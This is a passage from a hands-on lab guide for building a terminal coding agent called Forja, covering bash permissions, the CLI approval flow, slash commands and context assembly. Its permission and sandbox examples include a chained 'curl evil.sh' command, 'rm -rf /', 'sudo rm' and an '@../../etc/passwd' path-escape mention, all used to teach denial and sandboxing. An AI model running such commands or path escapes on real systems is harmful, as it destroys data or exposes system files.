4. Pre-approve the tests: create `playground/.forja/settings.json` with `{"permissions": {"allow": ["bash(python -m pytest*)"]}}`, restart `forja --cwd playground`, ask again: no prompt this time. Delete the file afterwards.
5. Check the *always* rule: `python -c "from forja.shell import make_shell_tool; from forja.fs_tools import Workspace; from forja.permissions import suggest_rule; print(suggest_rule(make_shell_tool(Workspace('.')), {'command': 'git status --short'}))"` → `bash(git status*)`. (Answering `a` in the CLI needs lab 05's prompt.)
6. Windows: ask `list the files with ls` and watch `'ls' is not recognized as an internal or external command` with `exit_code=1`; the model should retry with `dir`.

### If something goes wrong
| Symptom | Cause → fix |
|---|---|
| `test_bash_runs_in_root_with_exit_code`: `exit_code=1` with `No module named pytest` / `'python' is not recognized` | The venv isn't active in the terminal running pytest, so `python` in the child shell is another interpreter → activate `.venv` and re-run. |
| `test_bash_timeout` fails with `ERROR in 'bash': TimeoutExpired: …` | You let `subprocess.TimeoutExpired` propagate → catch it and return a `ToolOutput` with `TIMEOUT after Ns.` |
| The agent hangs forever on a command | Missing `stdin=subprocess.DEVNULL` or `timeout=` in `subprocess.run` → add both. |
| `decide` returns `"allow"` for `python -m pytest -q && curl evil.sh` | You matched allow rules against the whole string → for bash, every subcommand from `split_commands` must match. |
| `decide` returns `"allow"` for `sudo rm x` in bypass | Allow/bypass checked before deny → the deny pass must be the very first thing. |
| `rule_matches` behaves differently on Windows and macOS | You used `fnmatch.fnmatch` (case-insensitive on Windows) → use `fnmatch.fnmatchcase`. |
| Windows: `UnicodeDecodeError` or garbled accents in the command output | You dropped `encoding="utf-8", errors="replace"` from `subprocess.run` → add them back (the console code page is not UTF-8). |
| `a` (always) at the CLI prompt is treated as *no* | Until lab 05 the approval prompt is the minimal `[y/N]` one → `always` arrives with TODO 05.3. |

### You're done when
- [ ] [ ] `python scripts/tasks.py test 04` → all 8 tests green.
- [ ] [ ] Forja asks before `python -m pytest`, shows `exit_code=…` and names the 3 failing playground tests.
- [ ] [ ] `sudo …` and `rm -rf /` are denied by policy without a prompt.
- [ ] [ ] You can explain the order deny > plan > allow > risk/mode > ask with an example.

### Checkpoint
Forja asks before `python -m pytest`; (the *a* = always option arrives with the lab 05 CLI). Try `sudo` or `rm -rf /`: denied by policy.

### Challenges
1. Add a deny rule for `git push` and ask the agent to push.
2. Windows: what changes when the shell is cmd.exe? Try asking for `ls`.

**Tests:** `tests/test_l04_bash_permissions.py` · **Fallen behind?** `python scripts/tasks.py catchup 05`


---

## Lab 05 · The CLI: your terminal agent

*Day 1 · 14:00–15:00*

**Goal:** Turn the harness into a pleasant tool: streaming, action summaries, diffs, approvals and slash commands.

### Concepts
- **Experience is part of the product:** the user must see WHAT the agent does (one line per tool), HOW the code changes (diff) and be able to stop it (Ctrl+C) or correct it.
- **Clear approvals:** what will run, why it's being asked (decision reason) and three answers: `y` (yes), `n` (no), `a` (always).
- **Slash commands:** `/mode`, `/tools`, `/todos`, `/context`, `/compact`, `/cost`, `/undo`, `/sessions`, `/clear`. They act on the harness without going through the model.
- **Headless:** `forja -p "…"` runs and exits: scripts, CI and evals (lab 12). With no user, anything needing approval is denied.

### What you implement
| TODO | File | What |
|---|---|---|
| 05.1 | `forja/cli.py` | summarize_call: one readable line per tool call |
| 05.2 | `forja/cli.py` | diff_styles: colour the diff |
| 05.3 | `forja/cli.py` | ask_approval: y / n / a (yes / no / always) |
| 05.4 | `forja/cli.py` | handle_slash: slash commands |

### Before you start
- Open `forja/cli.py`. Almost everything in it is provided UI plumbing (`RichEvents`, `repl`, `main`, `doctor`). You only write four small functions: `summarize_call`, `diff_styles`, `ask_approval` and `handle_slash`. Read `RichEvents.on_tool_start` / `on_tool_end` first: they show exactly where your functions are called.
- The UI calls your functions through `_safe(...)`, which only swallows `NotImplementedError`. Any other exception (e.g. a `KeyError` because the model omitted an argument) would crash the turn, so be defensive with `dict.get`.
- Libraries used: `rich` (`console.print`, `Panel`, `Text`), already imported. You do not need to learn rich in depth: `console.print(Panel(Text("..."), title="...", border_style="yellow"))` is all 05.3 needs.
- How it connects to the harness: `Forja.gate` (in `forja/harness.py`) calls `self.approver(tool, args, why)` when permissions answer `ask`; `build_app` passes your `ask_approval` as that approver. `handle_slash` receives the `Forja` object, so read the attributes it uses: `app.mode`, `app.set_mode()`, `app.registry.tools`, `app.todos`, `app.context_tokens()`, `app.compact_now()`, `app.usage`, `app.undo()`, `app.transcript.folder`, `app.history`, `app.settings.context_window`.
- This lab ends with the **day-1 milestone** (see the milestone section): your own agent fixes the 3 failing tests in `playground/`. Keep 15 minutes for it.

### Step by step
Do 05.2 first (5 minutes, pure string logic, builds confidence), then 05.1 (string formatting with many cases, and 05.3 reuses it), then 05.3 (tiny once 05.1 exists), and finish with 05.4, which is the longest and needs a quick read of `Forja` in `forja/harness.py`. Run each TODO's test as you go; then run the whole lab with `python scripts/tasks.py test 05` and go to the milestone.

#### TODO 05.1 · `forja/cli.py` · `summarize_call(name, args, width=100) -> str`

**What it must do:** Receives the tool name and the (raw, possibly incomplete) argument dict the model sent. Returns ONE line, at most `width` characters. Exact formats checked by `test_summarize_call`:
- `read_file` -> `Read a.py`; with `offset` different from 1 -> `Read a.py (from line 50)`
- `write_file` -> `Write n.md (2 lines)` (number of lines of `content`)
- `edit_file` -> `Edit path`
- `bash` -> `$ pytest -q` (the command, whitespace collapsed)
- `grep` -> `Grep 'def x' in src (*.py)` (path defaults to `.`; ` (include)` only if include is set)
- `glob` -> `Glob pattern`
- `task` -> `Task[explore] find VAT` (`subagent_type` defaults to `explore`)
- `todo_write` -> `Todos (N)` (number of items)
- anything else -> `name(k=v, k2=v2)`, e.g. `mcp__x__y(id=3)`
All runs of whitespace (spaces, newlines) become a single space. If the line is longer than `width`, cut it so the result is exactly `width` characters long, ending in `…`.

**Steps:**
1. Branch on `name` with an `if/elif` chain and build a string `s` for each known tool, reading arguments with `args.get(key, default)`.
2. For `read_file`, start with `Read <path>` and append ` (from line N)` only when `args.get("offset", 1) != 1`.
3. For `write_file`, count lines with `str(content).splitlines()`; for `grep`, add the ` (<include>)` suffix only when include is truthy.
4. For the fallback, join `f"{k}={v}"` pairs with `", "` inside `name(...)` (optionally trim long values to ~30 chars each).
5. Collapse whitespace on the final string: `" ".join(s.split())`.
6. Truncate last: if `len(s) > width`, keep the first `width - 1` characters and add `…`.

**Watch out for:**
- Collapse whitespace BEFORE truncating, otherwise the length check uses the wrong string (`test_summarize_call` checks `len(...) == 50` with `width=50`).
- The cut must give exactly `width` characters including the `…` (one character), not `width + 1` and not `...` (three dots).
- `args` comes straight from the model's JSON (not validated): keys may be missing. Use `.get()` everywhere; a `KeyError` here crashes the turn.
- `bash` with `"pytest  -q\n"` must become `$ pytest -q`: double spaces and the trailing newline disappear.

<details><summary>💡 Hint 1</summary>

Think of it as a lookup of 9 formats plus two post-processing steps (collapse, truncate) applied to whatever you built.

</details>

<details><summary>💡 Hint 2</summary>

The default values matter for the expected strings: grep path `'.'`, task type `'explore'`, read offset `1`, todos `[]`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
if name == "read_file":
    s = f"Read {args.get('path')}"
    # if offset != 1: append " (from line N)"
elif name == "bash":
    s = ...
# elif ... write_file / edit_file / grep / glob / task / todo_write
else:
    s = f"{name}(...)"   # k=v pairs
s = ...                  # collapse whitespace
return ...               # truncate to width with '…'
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l05_cli.py -k summarize -v
```

#### TODO 05.2 · `forja/cli.py` · `diff_styles(diff: str) -> list[tuple[str, str]]`

**What it must do:** Receives a unified diff as one string (the `diff` that `write_file`/`edit_file` put in `ToolResult.meta`). Returns one `(line, style)` tuple per line, in order, with the line text unchanged (no newline). Styles: `'+++'` or `'---'` -> `'bold'`; `'@@'` -> `'cyan'`; `'+'` -> `'green'`; `'-'` -> `'red'`; everything else -> `'dim'`. `test_diff_styles` expects `["bold", "bold", "cyan", "red", "green", "dim"]` for a 6-line diff.

**Steps:**
1. Split the diff into lines with `str.splitlines()`.
2. For each line, test the prefixes from most specific to least specific: headers (`+++`, `---`), then hunk (`@@`), then `+`, then `-`.
3. Append `(line, style)` to the output list; default style is `dim`.
4. Return the list (an empty diff gives `[]`).

**Watch out for:**
- Order matters: `'--- a/x'` also starts with `'-'`. If you test `'-'` first, headers come out red and the test fails.
- `str.startswith` accepts a tuple: `line.startswith(("+++", "---"))`.
- Do not strip lines: a context line starts with a space, and the UI prints it as-is.

<details><summary>💡 Hint 1</summary>

It is a loop with an `if/elif` chain over prefixes.

</details>

<details><summary>💡 Hint 2</summary>

Check the 3-character prefixes before the 1-character ones.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
out = []
for line in diff.splitlines():
    if line.startswith(("+++", "---")):
        style = "bold"
    # elif '@@' ... elif '+' ... elif '-' ...
    else:
        style = "dim"
    out.append(...)
return out
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l05_cli.py -k diff_styles -v
```

#### TODO 05.3 · `forja/cli.py` · `ask_approval(tool, args, reason, read=input) -> Approval`

**What it must do:** Called by `Forja.gate` when the permission decision is `ask`. Shows the user what is about to run (a `Panel` with `summarize_call(tool.name, args, ...)`) and why it is being asked (`reason`, e.g. `requires approval`). Reads ONE answer by calling `read(prompt_text)`. Returns the literal string `"yes"` for `y`/`yes`, `"always"` for `a`/`always`, and `"no"` for anything else, including an empty answer. `test_ask_approval` passes `read=lambda _: "y"`, `"a"` and `""`. With `always`, the harness (not you) adds a rule via `permissions.suggest_rule`.

**Steps:**
1. Build the summary with `summarize_call(tool.name, args, width=...)`; use a large width (e.g. 400) so the user sees the full command before approving it.
2. Print it with `console.print(Panel(Text(summary), title=..., border_style="yellow"))`; put `tool.name` and `reason` in the title.
3. Call `read("  [y]es / [n]o / [a]lways this session > ")` and normalise the answer with `str(...).strip().lower()`.
4. Map the answer to `"yes"`, `"always"` or `"no"` and return it.

**Watch out for:**
- Use the `read` parameter, never `input()` or `console.input()` directly: the tests inject `read`, and under pytest a real `input()` fails because stdin is captured.
- Return exactly `"yes"` / `"no"` / `"always"` (the `Approval` literal), not booleans and not `"y"`.
- Default is NO: an empty answer (just Enter), `nope` or anything unknown -> `"no"`. Safe by default. Normalise first, so ` Y ` still counts as yes.
- Wrap the summary in `Text(...)`: if you pass a raw string, rich interprets `[brackets]` in commands as markup.

<details><summary>💡 Hint 1</summary>

Two parts: print something, then translate one answer into one of three strings.

</details>

<details><summary>💡 Hint 2</summary>

Membership tests are enough: `ans in ("y", "yes")`, `ans in ("a", "always")`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
summary = summarize_call(tool.name, args, width=400)
console.print(Panel(Text(summary), title=f"Allow {tool.name}? (...)", border_style="yellow"))
ans = ...  # read(...) normalised
if ...:
    return "yes"
# always?
return "no"
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l05_cli.py -k approval -v
```

#### TODO 05.4 · `forja/cli.py` · `handle_slash(app: Forja, line: str) -> str | None`

**What it must do:** Receives the raw line typed in the REPL (starts with `/`). Returns the text to print, or `None` for `/exit`. It acts on the harness directly, never calls the model. Checked by `test_slash_commands`:
- `/exit` -> `None`; `/help` -> `HELP` (contains `/mode`)
- `/mode` alone -> current mode and the list `MODES`; `/mode plan` -> exactly `mode -> plan` and `app.mode == "plan"` (use `app.set_mode`, which raises `ValueError` for unknown modes; the REPL catches it and prints `error: ...`)
- `/tools` -> one line per tool with its risk in brackets, e.g. `bash   [exec]`
- `/todos` -> `app.todos.render()` (contains `▶ a` for an in-progress item)
- `/context` -> text containing `tokens` (use `app.context_tokens()`, optionally `app.settings.context_window` and `len(app.history)`)
- `/compact` -> `app.compact_now(force=True)` (or a fallback text if it returns empty)
- `/cost` -> text containing `input` (from `app.usage['prompt_tokens']` and `['completion_tokens']`)
- `/undo` -> `app.undo()` returns a list of `Path`; show them relative (`app.ws.rel(p)`) or say nothing to undo
- `/sessions` -> `Transcript.list_sessions(app.transcript.folder)` gives `[(id, first_message)]`
- `/clear` -> empties `app.history` (and the todo list) and returns exactly `new conversation`
- anything else -> a message containing `unknown`

**Steps:**
1. Split the line into command and argument: `line.strip().split(maxsplit=1)`; the argument is the rest (or `""`).
2. Handle `/exit` and `/help` first (trivial returns).
3. `/mode`: without argument describe the current mode; with argument call `app.set_mode(arg)` and return `f"mode -> {app.mode}"`.
4. Read-only commands: `/tools` (iterate `app.registry.tools.values()`, each `Tool` has `.name` and `.risk`), `/todos`, `/context`, `/cost`, `/sessions`; build a string for each.
5. Commands with effects: `/compact`, `/undo`, `/clear` (assign `app.history = []` and `app.todos.items = []`).
6. End with the fallback for unknown commands, suggesting `/help`.

**Watch out for:**
- `/mode plan` must return exactly `mode -> plan` (ASCII `->`, one space each side).
- `/clear` must return exactly `new conversation` and leave `app.history == []` (assign a new list).
- Do not catch the `ValueError` of `set_mode` yourself and return `None`: `None` means exit and would close the REPL. Let it propagate or return an error text.
- `app.compact_now(force=True)` may return `""` (nothing to compact); return a readable fallback instead of an empty line.
- `/undo` and `/compact` depend on labs 11 and 07: until then the harness falls back quietly (empty list / nothing compacted). That is fine.

<details><summary>💡 Hint 1</summary>

A flat sequence of `if cmd == "/...": return ...` reads better than a dict of lambdas here.

</details>

<details><summary>💡 Hint 2</summary>

Everything you need is already on `app`: `app.registry.tools`, `app.todos.render()`, `app.context_tokens()`, `app.usage`, `app.transcript.folder`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
cmd, *rest = line.strip().split(maxsplit=1)
arg = rest[0].strip() if rest else ""
if cmd == "/exit":
    return None
if cmd == "/mode":
    if not arg:
        return ...            # current mode + MODES
    app.set_mode(arg)
    return f"mode -> {app.mode}"
# /help /tools /todos /context /compact /cost /undo /sessions /clear
return f"unknown command: {cmd} (/help)"
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l05_cli.py -k slash -v
```

### Run
```bash
python scripts/tasks.py test 05
forja --cwd playground --mode accept_edits
> fix the amount rounding bug and check with the tests
/tools
/cost
```

### Try it in your agent
1. Check the model first: `forja doctor`. Expected: `backend=ollama url=... model=...`, `answered in N.Ns`, then `✔ the model calls tools (ping)`.
2. Start the REPL on the playground: `forja --cwd playground --mode accept_edits`. You see a cyan panel `Forja <version> · <model> · mode accept_edits` and the prompt `accept_edits ›`.
3. Type `/tools`: one line per tool, e.g. `read_file   [read]`, `edit_file   [edit]`, `bash   [exec]`. Then `/mode`: `current mode: accept_edits (available: default, accept_edits, plan, bypass)`.
4. Ask: `fix the amount rounding bug and check with the tests`. You should see one blue line per action (`⏺ Read invoices/amounts.py`, `⏺ $ python -m pytest -q`), a framed green/red diff after every edit, and a yellow `Allow bash? (requires approval)` panel before each command. Answer `a` once: a dim note `rule added for this session: allow bash(python -m pytest*)` appears and later pytest runs no longer ask.
5. After the turn: `(N steps · M tools)` in grey. Type `/cost` (`input ... · output ... tokens`) and `/context` (`~N tokens of 32768 (M messages)`).
6. Press Ctrl+C during a long answer: `interrupting…` and the agent stops at the next step boundary. Then `/exit`.

### Day-1 milestone
1. **Goal (15:15):** with YOUR Forja and YOUR local model, the 3 failing tests in `playground/` pass. Then compare results with a pair using a different model.
2. **1. Reset the playground.** From the repo root: `python scripts/tasks.py reset` (same command on Windows and macOS/Linux). Check the starting point: `cd playground` then `python -m pytest -q`, then `cd ..`. Expected summary: `3 failed, 4 passed` (`test_round_half_up`, `test_total_with_vat_cent`, `test_due_date_sunday_moves_to_monday`).
3. **2. Check the model.** `forja doctor` must end with `✔ the model calls tools`. If it prints `! the model answered without calling the tool`, switch model (`FORJA_MODEL` in `.env`) or use the classroom server before you go on.
4. **3. Start the agent.** `forja --cwd playground --mode accept_edits` (edits are auto-approved, commands ask). Start a stopwatch when you press Enter on the prompt.
5. **4. Prompt to use** (paste it as one line). Lab 06 is not done yet, so the agent does NOT see `playground/AGENTS.md`: the prompt carries the project rules itself:
> Run the tests with `python -m pytest -q`, find why 3 tests fail and fix the code in `invoices/` (never change the tests). Amounts have 2 decimals with half-up rounding using `decimal`, never `round()` on floats. Due dates falling on Saturday or Sunday move to the next Monday. When you finish, run the tests again and show me the result.
6. **5. Approvals.** When the yellow `Allow bash?` panel shows `$ python -m pytest -q`, answer `a` (always): only pytest gets a session rule. Answer `n` to anything you would not run on your own machine (installing packages, deleting files).
7. **6. What a GOOD run looks like:** `⏺ $ python -m pytest -q` (3 failures) → `⏺ Read invoices/amounts.py` / `⏺ Read invoices/dates.py` → `⏺ Edit invoices/amounts.py` with a diff that rounds through `Decimal(str(value))` + `ROUND_HALF_UP` → `⏺ Edit invoices/dates.py` with a diff that also handles Sunday → `⏺ $ python -m pytest -q` showing `7 passed` → a short summary citing the files. Typically 6–15 steps, one turn, no edits under `tests/`.
8. **7. What a BAD run looks like** (record it, it is data, not failure): the model edits `tests/` to make them pass; uses `Decimal(value)` on the float (2.675 stays 2.67) or adds `+ 0.0001` hacks; claims `all tests pass` without running pytest again; repeats the same failing `edit_file` until the loop detector stops it; rewrites a whole file with `write_file` and drops functions; answers with a code block instead of calling tools; reaches `max_steps`. Give at most two corrective follow-up prompts (e.g. `the tests still fail, run them and read the error`) and count them.
9. **8. Verify outside the agent.** `/exit`, then `cd playground` and `python -m pytest -q` → `7 passed`. Check that only `invoices/` changed: `git status playground` (or `git diff --stat playground`). If a test file changed, the run does not count as a success.
10. **9. Record your result** (in your workbook or the shared sheet): **model** (exact tag, e.g. `qwen3:8b`, plus backend: local Ollama / classroom server / OpenRouter), **success** (yes/no and tests passing out of 7; note if you needed follow-up prompts), **steps** (the grey `(N steps · M tools)` line; add them up if there were several turns), **time** (stopwatch from Enter to the final answer; optionally `/cost` tokens). Then compare with a neighbour who used another model: who needed fewer steps, who broke a rule?
11. **10. Optional: a reproducible headless run.** `python scripts/tasks.py reset`, then time it: PowerShell `Measure-Command { forja --cwd playground --mode bypass -p "<same prompt>" }`, macOS/Linux `time forja --cwd playground --mode bypass -p "<same prompt>"`. Headless has no user: in `accept_edits` every command would be DENIED, hence `bypass` (deny rules still apply). Exit code 0 means the agent finished with a final answer, not that tests pass: run pytest yourself.

### If something goes wrong
| Symptom | Cause → fix |
|---|---|
| `test_ask_approval` hangs or fails with `OSError: pytest: reading from stdin while output is captured` | You called `input()`/`console.input()` instead of the `read` parameter → call `read(prompt)`. |
| `test_summarize_call` fails on the length assertion (51 != 50) or on `$ pytest  -q` | Truncation adds `…` without removing a character, or you truncate before collapsing whitespace → collapse first, then `s[:width - 1] + "…"`. |
| `test_diff_styles` gives `['red', 'green', ...]` for the headers | You test `-`/`+` before `---`/`+++` → check the 3-character prefixes first. |
| The REPL closes when you type `/mode foo` | `handle_slash` returned `None` for an error → only `/exit` returns `None`; let `set_mode`'s `ValueError` propagate (the REPL prints `error: unknown mode: foo`). |
| `KeyError` / crash on `⏺` lines when the model sends odd arguments | `summarize_call` uses `args['x']` → use `args.get('x', default)`; arguments come unvalidated from the model. |
| `forja` is not recognised (Windows) / `command not found` (macOS/Linux) | The venv is not active or setup was not run → PowerShell `.venv\Scripts\Activate.ps1` (if blocked: `Set-ExecutionPolicy -Scope CurrentUser RemoteSigned`), macOS/Linux `source .venv/bin/activate`, then `python scripts/tasks.py setup`. `python -m forja ...` also works. |
| Windows: the agent runs `ls`, `cat` or `python3` and gets errors | The bash tool uses `cmd.exe` on Windows → normal; the model should adapt after the error. Tell it: `use python -m pytest -q; this is Windows cmd`. |
| Colours or `⏺` show as garbage in old Windows consoles | Use Windows Terminal (or VS Code's terminal) instead of the legacy `cmd.exe` window; `chcp 65001` helps for UTF-8. |

### You're done when
- [ ] [ ] `python scripts/tasks.py test 05` → 4 passed.
- [ ] [ ] In the REPL you see one-line summaries, coloured diffs and the y/n/a approval panel; `/tools`, `/mode`, `/cost`, `/context` work.
- [ ] [ ] Day-1 milestone: your agent made the 3 failing playground tests pass, and you recorded model, success, steps and time.

### Checkpoint
**Day 1 milestone** (15:15): Forja fixes the 3 failing tests in `playground/` with your local model. Compare with a neighbour using another model.

### Challenges
1. Add `/model <name>` to switch models on the fly.
2. Show the % of context used in the REPL prompt.

**Tests:** `tests/test_l05_cli.py` · **Fallen behind?** `python scripts/tasks.py catchup 06`


---

## Lab 06 · Context engineering

*Day 2 · 09:00–09:40*

**Goal:** Decide what the model sees each turn: layered prompt, AGENTS.md, environment and @file mentions.

### Concepts
- **The system prompt is rebuilt every turn** in layers: agent base, mode reminder, project instructions, skills, todo list and environment (git, OS, date, model).
- **AGENTS.md:** an open convention for project instructions read by several tools. User global + from the highest folder down to the current one: most specific last.
- **Environment = cheap truth:** git branch and changes, directory, date. Stops the model guessing.
- **@mentions:** `@src/app.py` puts the file in the message (and marks it read). Saves a loop iteration.
- **Less is more with local models:** every prompt token competes with code. Short, concrete instructions.

### What you implement
| TODO | File | What |
|---|---|---|
| 06.1 | `forja/context.py` | find_instruction_files: user and hierarchy AGENTS.md |
| 06.2 | `forja/context.py` | build_system_prompt: layers in order |
| 06.3 | `forja/context.py` | expand_mentions: @path → content |

### Before you start
- Open `forja/context.py`. Read the provided parts first: `BASE_PROMPT`, `MODE_REMINDERS` (a dict mode -> text), `INSTRUCTION_FILES = ("AGENTS.md", "FORJA.md")`, `MENTION_RE` and `git_info(root)`. You write three functions.
- Look at `Forja.system_prompt()` and `Forja.turn()` in `forja/harness.py`: the harness calls `build_system_prompt(self.ws, self.mode, self.llm.model, self.home, cat, [todos])` EVERY step, and `expand_mentions(text, self.ws)` on every user message. Until this lab is done it uses the one-line `FALLBACK_PROMPT`, so your agent has never seen `AGENTS.md`.
- Stdlib you need: `pathlib.Path` (`/`, `.is_file()`, `.resolve()`, `.parent`, `.read_text(encoding="utf-8")`, `.is_relative_to()`), `re.Pattern.findall`, `dict.fromkeys(...)` (order-preserving de-duplication), `platform.system()`, `datetime.date.today().isoformat()`.
- From lab 02 you reuse the `Workspace` (`forja/fs_tools.py`): `ws.root`, `ws.resolve(path)` (raises `PermissionError` outside the sandbox), `ws.rel(p)` and `ws.mark_read(p)` (records the file in `ws.read_state` so a later `edit_file` does not complain that it was not read).

### Step by step
06.1 first: 06.2 calls it to get the instruction files. Then 06.2, the layered prompt, which is what turns AGENTS.md on in your CLI. 06.3 is independent; leave it for last. After 06.2 passes, lab 08's `test_plan_mode_flow` also depends on it (it checks `PLAN mode` and the task list in the system prompt).

#### TODO 06.1 · `forja/context.py` · `find_instruction_files(cwd, home=None, stop=None) -> list[Path]`

**What it must do:** Returns the instruction files that apply to `cwd`, in the order they must appear in the prompt: first the user's global `home/.forja/AGENTS.md` (only if `home` is given and the file exists), then every `AGENTS.md`/`FORJA.md` found walking UP from `cwd`, returned from the HIGHEST folder down to `cwd` (most specific last). The walk stops after checking `stop` (inclusive) or at the filesystem root. `test_find_instruction_files_order` builds `home/.forja/AGENTS.md`, `repo/AGENTS.md`, `repo/pkg/AGENTS.md` and expects the contents `["global", "root", "package"]` when called with `cwd=repo/pkg, stop=tmp_path`.

**Steps:**
1. Start a `found` list with the global file if `home` is set and `home / ".forja" / "AGENTS.md"` is a file.
2. Set `d = cwd.resolve()` and loop: for each name in `INSTRUCTION_FILES`, if `d / name` is a file, add it to a `chain` list.
3. Stop the loop when `d` equals the resolved `stop`, or when `d.parent == d` (you are at the root); otherwise move to `d.parent`.
4. `chain` is now lowest-first; reverse it so the highest folder comes first.
5. Return `found + reversed chain`.

**Watch out for:**
- Resolve BOTH `cwd` and `stop` before comparing. On macOS `tmp_path` lives under `/var`, which is a symlink to `/private/var`: comparing a resolved and an unresolved path never matches, and you walk to `/`.
- Root detection: `d.parent == d` works on Windows too (`C:\` is its own parent). Do not compare with `Path("/")`.
- Check `stop` AFTER collecting files in that folder: `stop` is inclusive.
- The global file goes first, before the reversed chain, not mixed into it.

<details><summary>💡 Hint 1</summary>

It is a `while True` walk from `cwd` up to the root, collecting files, then a reverse.

</details>

<details><summary>💡 Hint 2</summary>

Collect bottom-up (natural for a walk upwards) and reverse once at the end, instead of inserting at index 0.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
found = []
if home and (home / ".forja" / "AGENTS.md").is_file():
    found.append(...)
chain, d = [], cwd.resolve()
while True:
    # collect INSTRUCTION_FILES present in d
    if ... or d.parent == d:   # reached stop (resolved) or root
        break
    d = d.parent
return found + ...
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l06_context.py -k find_instruction -v
```

#### TODO 06.2 · `forja/context.py` · `build_system_prompt(ws, mode, model, home=None, skills_catalog="", extra=None) -> str`

**What it must do:** Returns the full system prompt: non-empty layers joined with a blank line (`"\n\n"`), in this order: `BASE_PROMPT`; `MODE_REMINDERS[mode]`; one block per file from `find_instruction_files(ws.root, home=home)`, each with a `## ... instructions` heading followed by the file content; `skills_catalog` if non-empty; each non-empty string in `extra` (the harness passes the task list here); and finally a `## Environment` block with the working directory (`ws.root`), `git_info(ws.root)`, OS (`platform.system()`), date (`date.today().isoformat()`) and `model`. `test_system_prompt_layers` checks that `You are Forja`, `PLAN mode`, `half-up` (from `playground/AGENTS.md`), `## Skills`, `## Extra`, the model name and `str(project)` are present, and that `PLAN mode` comes before `half-up`, which comes before `## Environment`.

**Steps:**
1. Start a `layers` list with `BASE_PROMPT` and the reminder for `mode` (`MODE_REMINDERS.get(mode, "")` is safe).
2. For each file from `find_instruction_files(ws.root, home=home)`, add `"## <label>\n<content>"`. A useful label: `User global instructions` for the file under `home/.forja`, `Project instructions (<relative path>)` for the others.
3. Append `skills_catalog` if not empty, then each non-empty element of `extra or []`.
4. Append the `## Environment` block (directory, `git_info(ws.root)`, OS, date, model) as one multi-line string.
5. Return `"\n\n".join(...)` over the non-empty layers.

**Watch out for:**
- Read files with `read_text(encoding="utf-8")`. On Windows the default encoding is cp1252 and AGENTS.md files with accents or `—` raise `UnicodeDecodeError` or come out garbled.
- `extra` may be `None` and may contain `""` (the test passes `["## Extra", ""]`, the harness passes `[""]` when there are no todos): filter empty strings so you do not get stray blank sections.
- Call `find_instruction_files` with `ws.root`, not `Path.cwd()`: with `forja --cwd playground` the process cwd is the repo root.
- `f.relative_to(ws.root)` raises `ValueError` for files above the workspace or in home: guard with `f.is_relative_to(ws.root)`.
- The test needs `str(project)` in the prompt: print `ws.root` itself (absolute), not `.`.

<details><summary>💡 Hint 1</summary>

Build a list of strings in order and join it once; do not concatenate with `+=` and forget separators.

</details>

<details><summary>💡 Hint 2</summary>

The harness already gives you everything: `ws.root`, `mode`, `model`, `skills_catalog`, `extra`. You only add the files and the environment.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
layers = [BASE_PROMPT, MODE_REMINDERS.get(mode, "")]
for f in find_instruction_files(ws.root, home=home):
    label = ...   # global vs project (relative path)
    layers.append(f"## {label}\n{...}")
# skills_catalog, extra (non-empty only)
layers.append(f"## Environment\nWorking directory: {ws.root}\n{git_info(ws.root)}\n...")
return "\n\n".join(x for x in layers if x)
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l06_context.py -k system_prompt -v
```

#### TODO 06.3 · `forja/context.py` · `expand_mentions(text, ws, max_chars=20_000) -> str`

**What it must do:** Finds `@path` mentions with `MENTION_RE` (it already ignores e-mail addresses like `joe@mail.com`). For each UNIQUE mention that resolves inside the workspace to an existing FILE: read it (at most `max_chars` characters), call `ws.mark_read(p)`, and append a block `<file path="<relative path>">\n<content>\n</file>` at the END of the original text (the text itself is not modified). Mentions outside the sandbox (`@../../etc/passwd` -> `PermissionError`), missing files (`@nobody`) and folders are skipped silently. With no valid mention, return `text` unchanged (`expand_mentions("no mentions", ws) == "no mentions"`). `test_expand_mentions` expects exactly one `<file` block with `path="invoices/dates.py"`, the file content (`def due_date`) and the path in `ws.read_state`.

**Steps:**
1. Get the mentions with `MENTION_RE.findall(text)` and de-duplicate keeping order (`dict.fromkeys(...)`).
2. Strip trailing punctuation from each mention: the regex stops at `,` but it allows `.`, so `look at @src/app.py.` captures `src/app.py.`. Use `ref.rstrip(".,;:")`.
3. Resolve with `ws.resolve(ref)` inside `try/except PermissionError: continue`; skip if `not p.is_file()`.
4. Read with `read_text(encoding="utf-8", errors="replace")`, cut to `max_chars` (add a `…[truncated]` marker), `ws.mark_read(p)`, and build the `<file path=...>` block.
5. If you have blocks, return `text + "\n\n" + "\n\n".join(blocks)`; otherwise return `text`.

**Watch out for:**
- A mention at the end of a sentence (`look at @src/app.py.`) captures the final dot: strip trailing `.,;:` or the file is not found.
- Use `ws.rel(p)` for the `path` attribute: it already returns a POSIX path (`invoices/dates.py`) on Windows too, which is what the test looks for.
- Call `ws.mark_read(p)` for every included file: the test checks `ws.read_state`, and in the CLI it lets the model `edit_file` right away without a `read_file` round-trip.
- Do not replace the mention inside the text: keep the user's sentence intact and append blocks after it.
- Do not let one bad mention abort the others: `continue`, never `return` inside the loop.

<details><summary>💡 Hint 1</summary>

Loop over mentions, filter the valid ones, build a list of blocks, append them at the end.

</details>

<details><summary>💡 Hint 2</summary>

The sandbox is already done (lab 02): `ws.resolve` raising `PermissionError` is your filter for `../` paths.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
blocks = []
for ref in dict.fromkeys(MENTION_RE.findall(text)):
    try:
        p = ws.resolve(ref.rstrip(".,;:"))
    except PermissionError:
        continue
    # skip non-files; read (cap max_chars); ws.mark_read(p)
    blocks.append(f'<file path="{...}">\n{...}\n</file>')
return ...  # text unchanged if no blocks
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l06_context.py -k mentions -v
```

### Run
```bash
python scripts/tasks.py test 06
forja --cwd playground
> review @invoices/amounts.py and tell me whether it follows AGENTS.md
```

### Try it in your agent
